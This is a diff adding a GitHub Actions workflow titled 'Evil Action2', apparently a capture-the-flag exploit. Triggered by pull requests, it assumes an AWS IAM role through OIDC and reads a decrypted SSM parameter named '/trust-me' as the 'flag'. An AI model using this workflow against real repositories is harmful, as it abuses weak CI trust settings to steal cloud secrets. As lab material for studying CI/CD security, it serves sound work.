@@ -1,0 +1,31 @@
+---
+name: Evil Action2
+
+on:
+  pull_request:
+    branches:
+      - 'main' 
+
+
+jobs:
+  exec:
+    name: get-flag
+    runs-on: ubuntu-latest
+    environment: production
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v3
+        with:
+          fetch-depth: 0
+      - name: Configure AWS Credentials
+        uses: aws-actions/configure-aws-credentials@v1-node16
+        with:
+          role-to-assume: arn:aws:iam::987990985088:role/t_rodman
+          role-session-name: GitHubActionsRelease
+          aws-region: us-west-2
+      - name: get flag
+        run: |
+          aws --region us-west-2 ssm get-parameter --with-decryption --name /trust-me
